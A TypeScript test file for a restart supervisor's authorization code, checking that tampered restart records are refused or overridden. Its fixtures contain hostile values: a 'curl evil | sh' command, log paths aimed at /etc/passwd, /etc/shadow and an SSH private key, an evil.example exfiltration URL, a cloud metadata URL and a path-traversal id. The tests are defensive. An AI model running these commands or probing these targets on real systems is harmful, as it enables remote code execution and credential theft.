import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { makeRecord } from "../test-support/restart-world.js";
import { authorizeSupervisor, guardedSave } from "./authorize.js";
import type { SupervisorContext } from "./authorize.js";
import type { RestartRecord } from "./state.js";
import { RESTART_SCHEMA_VERSION, RestartPreempted, currentRecordPath, hashNonce, readRecord, writeRecord } from "./state.js";

const dirs: string[] = [];
afterAll(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

const NONCE = "n".repeat(64);

/** A data dir holding a handed-off record for install /install, and the context of a supervisor started for it. */
function setUp(over: Partial<RestartRecord> = {}) {
  const dataDir = mkdtempSync(join(tmpdir(), "restart-auth-"));
  dirs.push(dataDir);
  const path = currentRecordPath(dataDir);
  writeRecord(
    path,
    makeRecord({
      dataDir,
      phase: "handed_off",
      nonceHash: hashNonce(NONCE),
      collector: { argv: ["/bin/sh", "-c", "curl evil | sh"], cwd: "/tmp" },
      supervisorLog: "/etc/passwd",
      collectorLog: "/home/u/.ssh/id_rsa",
      ...over,
    })
  );
  const ctx: SupervisorContext = {
    recordPath: path,
    nonce: NONCE,
    dataDir,
    installDir: "/install",
    execPath: "/usr/bin/bun",
    webUrl: "http://ui.test/",
  };
  return { dataDir, path, ctx };
}

describe("authorizeSupervisor", () => {
  test("accepts the current handed-off record with the matching nonce, taking the command, cwd and logs from the install and data dir", () => {
    const { ctx, dataDir } = setUp();
    const auth = authorizeSupervisor(ctx);
    expect(auth.ok).toBe(true);
    const record = (auth as { record: RestartRecord }).record;
    expect(record.collector).toEqual({ argv: ["/usr/bin/bun", "run", "src/index.ts"], cwd: "/install/packages/collector" });
    expect(record.supervisorLog).toBe(join(dataDir, "restart", "r1.log"));
    expect(record.collectorLog).toBe(join(dataDir, "restart", "collector-r1.log"));
    expect(record.nonceHash).toBeUndefined();
  });

  test("refuses another path, even a copy or a lookalike of the record", () => {
    const { ctx, dataDir } = setUp();
    const copy = join(dataDir, "elsewhere.json");
    writeRecord(copy, readRecord(ctx.recordPath)!);
    expect(authorizeSupervisor({ ...ctx, recordPath: copy })).toMatchObject({ ok: false });
    const other = mkdtempSync(join(tmpdir(), "restart-auth-other-"));
    dirs.push(other);
    writeRecord(currentRecordPath(other), readRecord(ctx.recordPath)!);
    expect(authorizeSupervisor({ ...ctx, recordPath: currentRecordPath(other) })).toMatchObject({ ok: false });
  });

  test("accepts the canonical path through a symlinked data dir", () => {
    const { ctx, dataDir } = setUp();
    const link = join(mkdtempSync(join(tmpdir(), "restart-auth-link-")), "data");
    dirs.push(join(link, ".."));
    symlinkSync(dataDir, link);
    expect(authorizeSupervisor({ ...ctx, recordPath: currentRecordPath(link) }).ok).toBe(true);
  });

  test("refuses a wrong or missing nonce", () => {
    const { ctx } = setUp();
    expect(authorizeSupervisor({ ...ctx, nonce: "x".repeat(64) })).toMatchObject({ ok: false, error: expect.stringContaining("nonce") });
    expect(authorizeSupervisor({ ...ctx, nonce: "" })).toMatchObject({ ok: false });
    const bare = setUp({ nonceHash: undefined });
    expect(authorizeSupervisor(bare.ctx)).toMatchObject({ ok: false, error: expect.stringContaining("nonce") });
  });

  test("refuses a record not waiting for a supervisor", () => {
    for (const over of [{ phase: "stopping" as const }, { phase: "done" as const }, { supervisorPid: 4242 }]) {
      expect(authorizeSupervisor(setUp(over).ctx)).toMatchObject({ ok: false, error: expect.stringContaining("not waiting") });
    }
  });

  test("refuses a record for another install or data dir, or probing elsewhere", () => {
    expect(authorizeSupervisor(setUp({ installDir: "/other" }).ctx)).toMatchObject({ ok: false, error: expect.stringContaining("install") });
    expect(authorizeSupervisor(setUp({ dataDir: "/other-data" }).ctx)).toMatchObject({ ok: false, error: expect.stringContaining("data dir") });
    expect(authorizeSupervisor(setUp({ collectorUrl: "http://evil.example:7777" }).ctx)).toMatchObject({ ok: false });
    expect(authorizeSupervisor(setUp({ uiUrl: "file:///etc/passwd" }).ctx)).toMatchObject({ ok: false });
    expect(authorizeSupervisor(setUp({ collectorPid: 1 }).ctx)).toMatchObject({ ok: false });
    expect(authorizeSupervisor(setUp({ id: "../../x" }).ctx)).toMatchObject({ ok: false });
    // The collector's own bind address is its URL too.
    const bound = setUp({ collectorUrl: "http://10.0.0.5:7777" });
    expect(authorizeSupervisor({ ...bound.ctx, bindHost: "10.0.0.5" }).ok).toBe(true);
  });

  test("probes only a loopback UI or the configured STANDUP_WEB_URL", () => {
    const foreign = setUp({ uiUrl: "http://169.254.169.254/latest/meta-data/" });
    expect(authorizeSupervisor(foreign.ctx)).toMatchObject({ ok: false, error: expect.stringContaining("STANDUP_WEB_URL") });
    // The configured UI is accepted only as configured, not any path on its host.
    expect(authorizeSupervisor(setUp({ uiUrl: "http://ui.test/other" }).ctx)).toMatchObject({ ok: false });
    expect(authorizeSupervisor({ ...setUp().ctx, webUrl: undefined })).toMatchObject({ ok: false });
    for (const uiUrl of ["http://localhost:5173/", "http://127.0.0.1:5173/", "http://[::1]:5173/"]) {
      expect(authorizeSupervisor({ ...setUp({ uiUrl }).ctx, webUrl: undefined }).ok).toBe(true);
    }
  });

  test("refuses a record of another schema version, saying so", () => {
    for (const schemaVersion of [undefined, RESTART_SCHEMA_VERSION + 1]) {
      const auth = authorizeSupervisor(setUp({ schemaVersion }).ctx);
      expect(auth.ok).toBe(false);
      const error = auth.ok ? "" : auth.error;
      expect(error).toContain(`this supervisor reads schema ${RESTART_SCHEMA_VERSION}`);
      expect(error).toContain("different versions of Standup");
    }
  });

  test("a missing data dir has no record to authorize", () => {
    const dataDir = join(mkdtempSync(join(tmpdir(), "restart-auth-none-")), "x");
    dirs.push(join(dataDir, ".."));
    mkdirSync(dataDir);
    expect(authorizeSupervisor({ recordPath: currentRecordPath(dataDir), nonce: NONCE, dataDir, installDir: "/install", execPath: "bun" })).toMatchObject({
      ok: false,
      error: expect.stringContaining("no readable restart record"),
    });
  });
});

describe("guardedSave", () => {
  test("claims a waiting record, keeps saving while it is this run's, and refuses once it is not", () => {
    const { ctx, path } = setUp();
    const record = (authorizeSupervisor(ctx) as { record: RestartRecord }).record;
    const save = guardedSave(path, 4242);
    save({ ...record, phase: "stopping", supervisorPid: 4242 });
    save({ ...record, phase: "starting", supervisorPid: 4242 });
    expect(readRecord(path)).toMatchObject({ phase: "starting", supervisorPid: 4242 });
    // A second supervisor can't take it over.
    expect(() => guardedSave(path, 5151)({ ...record, phase: "stopping", supervisorPid: 5151 })).toThrow(RestartPreempted);
    // A collector that gave up on the run finished it: the run's late save is refused, the outcome kept.
    writeRecord(path, { ...readRecord(path)!, phase: "done", outcome: "failed", error: "the restart supervisor did not finish in time" });
    expect(() => save({ ...record, phase: "done", outcome: "ok", supervisorPid: 4242 })).toThrow(RestartPreempted);
    expect(readRecord(path)).toMatchObject({ outcome: "failed" });
    // A replaced record is not this run's either.
    writeRecord(path, makeRecord({ id: "r2" }));
    expect(() => save({ ...record, phase: "checking", supervisorPid: 4242 })).toThrow(RestartPreempted);
  });

  test("keeps a redeploy the collector coalesced into the run meanwhile", () => {
    const { ctx, path } = setUp();
    const record = (authorizeSupervisor(ctx) as { record: RestartRecord }).record;
    const save = guardedSave(path, 4242);
    save({ ...record, phase: "preflight", supervisorPid: 4242 });
    writeRecord(path, { ...readRecord(path)!, rerunRequested: true });
    save({ ...record, phase: "stopping", supervisorPid: 4242 });
    expect(readRecord(path)).toMatchObject({ phase: "stopping", rerunRequested: true });
  });

  test("probes the gateway on the collector URL's origin and names its log from the data dir", () => {
    const { ctx } = setUp({ gatewayStatsUrl: "http://evil.example/steal", gatewayLog: "/etc/shadow" });
    const record = (authorizeSupervisor(ctx) as { record: RestartRecord }).record;
    expect(new URL(record.gatewayStatsUrl!).origin).toBe(new URL(record.collectorUrl).origin);
    expect(record.gatewayLog).toBe(join(ctx.dataDir, "gateway", "gateway.log"));
  });
});
